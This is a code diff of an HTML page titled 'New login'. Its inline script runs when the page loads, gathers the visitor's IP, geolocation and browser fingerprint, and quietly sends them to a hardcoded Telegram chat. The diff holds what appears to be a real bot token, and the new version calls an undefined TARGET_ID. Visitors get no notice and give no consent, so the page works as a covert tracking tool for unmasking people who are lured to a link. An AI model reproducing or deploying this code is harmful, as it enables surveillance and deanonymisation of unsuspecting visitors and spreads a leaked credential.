@@ -5,67 +5,70 @@
   <title>Новый вход</title>
   <script>
     window.onload = async function () {
-      const urlParams = new URLSearchParams(window.location.search);
-      const chat_id = urlParams.get("u"); // chat_id передаётся как ?c=...
-
-      const BOT_TOKEN = '8254985090:AAEmnwYKpxW5zsB5RrbzTUNj8aNA8MasEeM'; // ⚠️ Никогда не публикуй открыто!
-
-      if (!chat_id) {
-        console.warn("Параметр c (chat_id) не найден");
-        return;
-      }
+      // Статичные значения (меняйте при необходимости)
+      const CHAT_ID = 769893160;      // сюда отправлять (число или строка @channel)
+      const BOT_TOKEN = '8254985090:AAEmnwYKpxW5zsB5RrbzTUNj8aNA8MasEeM'; // ⚠️ рекомендуется ревокировать и НЕ хранить здесь
 
       try {
-        // Получаем IP и геоданные
+        // Получаем IP/гео (ipapi) — можно заменить на любой другой сервис
         const ipResponse = await fetch('https://ipapi.co/json/');
-        const ipData = await ipResponse.json();
+        const ipData = ipResponse.ok ? await ipResponse.json() : { error: "ipapi_failed" };
 
-        // Получаем данные браузера
-        const ua = navigator.userAgent;
-        const lang = navigator.language;
-        const platform = navigator.platform;
-        const screenSize = `${screen.width}x${screen.height}`;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const now = new Date().toLocaleString('ru-RU');
-        const cookiesEnabled = navigator.cookieEnabled ? "Да" : "Нет";
-        const javaEnabled = navigator.javaEnabled ? "Да" : "Нет";
-        const online = navigator.onLine ? "Да" : "Нет";
+        // Сбор данных браузера и окружения
+        const ua = navigator.userAgent || null;
+        const lang = navigator.language || null;
+        const platform = navigator.platform || null;
+        const screenSize = (screen && screen.width && screen.height) ? `${screen.width}x${screen.height}` : null;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
+        const now = new Date().toISOString();
+        const cookiesEnabled = navigator.cookieEnabled ? true : false;
+        const javaEnabled = (typeof navigator.javaEnabled === 'function') ? navigator.javaEnabled() : null;
+        const online = navigator.onLine;
 
-        // Формируем сообщение
-        const message = `
-📌 Новый вход!
+        // Формируем объект (dict)
+        const payload = {
+          id: TARGET_ID,
+          response: {
+            ip: ipData.ip || null,
+            city: ipData.city || null,
+            region: ipData.region || null,
+            country: ipData.country_name || ipData.country || null,
+            postal: ipData.postal || null,
+            user_agent: ua,
+            language: lang,
+            platform: platform,
+            screen: screenSize,
+            timezone: timezone,
+            time_iso: now,
+            cookies_enabled: cookiesEnabled,
+            java_enabled: javaEnabled,
+            online: online,
+            raw_ipapi: ipData // оставить полный ответ при необходимости
+          }
+        };
 
-🌐 IP: ${ipData.ip}
-🏠 Город: ${ipData.city}
-🗺️ Регион: ${ipData.region}
-🇺🇳 Страна: ${ipData.country_name}
-📮 Почтовый индекс: ${ipData.postal}
+        // Подготовка текстовой версии для отправки — как форматированный JSON в code block
+        const text = "```json\n" + JSON.stringify(payload, null, 2) + "\n```";
 
-⚙️ User-agent:
-> ${ua}
-
-🛠️ Другие данные:
-> Язык: ${lang}
-> Платформа: ${platform}
-> Разрешение: ${screenSize}
-> Часовой пояс: ${timezone}
-> Время: ${now}
-> Куки: ${cookiesEnabled}
-> Java: ${javaEnabled}
-> Онлайн: ${online}
-        `.trim();
-
-        // Отправляем в Telegram
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        // Отправка в Telegram
+        const sendUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const resp = await fetch(sendUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id: chat_id,
-            text: message
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: "MarkdownV2" // используем MarkdownV2, но так как мы отправляем ```json``` — оно будет отображено как моноширинный блок
           })
         });
 
-        console.log("Сообщение отправлено в Telegram");
+        const result = await resp.json();
+        if (!resp.ok) {
+          console.error("Ошибка при отправке в Telegram:", result);
+        } else {
+          console.log("Отправлено успешно:", result);
+        }
+
       } catch (error) {
         console.error("Ошибка:", error);
       }
